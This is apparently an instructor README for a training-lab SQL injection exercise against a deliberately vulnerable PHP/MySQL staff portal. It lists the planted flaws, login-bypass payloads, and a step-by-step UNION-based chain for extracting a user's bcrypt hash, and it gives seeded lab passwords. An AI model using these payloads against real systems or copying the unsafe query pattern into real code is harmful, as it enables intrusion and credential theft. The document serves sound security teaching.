# Day 4 Lab — Q8 Portal · SQL Injection

A vulnerable PHP/MySQL web application that mimics Q8 Logistics' internal staff portal. Students exploit it to extract Ahmed Al-Rashid's bcrypt password hash from the users table.

---

## What gets deployed

Two containers via `docker compose`:

- **`q8-day4-web`** — PHP 8.2 + Apache, port 80
- **`q8-day4-db`** — MySQL 8 with seeded data

URL students hit: `http://<VPS_IP>/`

---

## How to run

```bash
cd /opt/q8-bootcamp-labs/labs/day4-sqli
docker compose up -d

# Wait ~10s for MySQL to seed, then verify:
curl http://localhost
```

To watch logs (helpful when students get stuck):

```bash
docker compose logs -f web      # Apache + PHP errors
docker compose logs -f db       # MySQL queries (set general_log = 1 to see all)
```

To reset between cohorts (or after students break it):

```bash
docker compose down -v
docker compose up -d --build
```

---

## Intentional vulnerabilities

### 1. Login form (`/login.php`)
- String concatenation: `WHERE username='$user' AND password='$pass'`
- No `password_verify` — any row match = "logged in"
- Both classic auth-bypass payloads work:
  - `' OR 1=1 -- ` in username field
  - `' OR '1'='1` in username
  - `admin' -- ` in username (logs in as admin without knowing the password)

### 2. Products page (`/products.php?id=N`) — primary classwork target
- `id` parameter inlined directly: `WHERE id=$id`
- Returns 3 visible columns (`name`, `price`, `category`) — perfect for `UNION SELECT` matching
- Errors are surfaced (helpful for blind-vs-error-based recon)

### 3. Hidden flag in `settings` table
- Discoverable via `information_schema` enumeration
- Encourages students to enumerate tables before going straight to `users`

---

## Expected student attack chain

```
Step 1: Recon
  ?id=5            → normal product
  ?id=5'           → SQL syntax error → confirms injection

Step 2: Find column count
  ?id=5 ORDER BY 1, 2, 3   → ok
  ?id=5 ORDER BY 4         → error → 3 columns

Step 3: Confirm UNION compatibility
  ?id=-1 UNION SELECT NULL,NULL,NULL    → empty row appears

Step 4: Enumerate database
  ?id=-1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()
  → returns: users, products, settings

Step 5: Enumerate users columns
  ?id=-1 UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'
  → returns: id, username, password, email, full_name, role, department, joined

Step 6: Extract Ahmed's hash
  ?id=-1 UNION SELECT username,password,role FROM users WHERE username='ahmed'
  → returns: ahmed | $2b$10$/aRi2O42... | IT Director

Step 7: Extract the flag
  ?id=-1 UNION SELECT config_key,config_value,NULL FROM settings WHERE config_key='flag'
  → returns: flag | FLAG{ahmeds_hash_belongs_to_us} | NULL
```

---

## Saga continuity check (important)

Ahmed's bcrypt hash here matches `Layan@2017`. Day 7 (Hashcat lab) cracks this exact hash. **If you change the hash here, update the Day 7 lab too** — they're tied together.

The hash students extract: `$2b$10$/aRi2O42f2JtOUjwYwv/j.p.fYi14GCS6fQJYNaV9TX/QrHyEoy5G`

---

## Common student blockers (and what to hint at)

| Symptom | Probable cause | Hint to give |
|---|---|---|
| "I get the products page but no SQL errors when I add a quote" | They added the quote inside the URL but URL-encoded it incorrectly | Try `?id=5%27` or just `?id=5'` raw — different shells/browsers handle differently |
| "ORDER BY always works no matter what number I try" | They're hitting a cached page or the param isn't being parsed | Confirm with `curl -v "http://VPS/products.php?id=5 ORDER BY 99"` |
| "UNION returns nothing" | Column count mismatch OR data type mismatch | Use NULLs: `UNION SELECT NULL,NULL,NULL` to test column count first |
| "I see the product listing but my UNION row never appears" | The original query returns a real row that pushes UNION rows below the fold OR they need `id=-1` to get only their UNION row | Suggest `id=-1` (no real row matches, so only UNION result returns) |
| "Page shows blank instead of error" | `display_errors` off in PHP | Check `docker compose logs web` for the actual SQL error |

---

## Hardening (DON'T do these — they break the lab)

If you want to demo what a fixed version looks like *after* the bootcamp, the patches would be:

1. **Login**: prepared statement + `password_verify($input, $hash)`
2. **Products**: `(int)$_GET['id']` cast OR prepared statement with `?` placeholder
3. **Errors**: don't echo `mysqli_error()` to users in production

Don't apply these to the deployed lab — they kill the teaching point.

---

## Reference: seeded users + their plaintext passwords (for instructor only)

| Username | Plaintext | Notes |
|---|---|---|
| admin    | `Q8Admin2024!`     | System admin |
| yousef   | `YousefHessa2014$` | CEO — wife's name + founding year |
| sarah    | `SarahLayla2018!`  | Marketing (also Day 1 OSINT target) |
| **ahmed**    | **`Layan@2017`**   | **IT — Day 7 crack target** |
| reem     | `Marketing@Q8`     | Marketing Lead |
| faisal   | `Operations123!`   | Head of Operations |
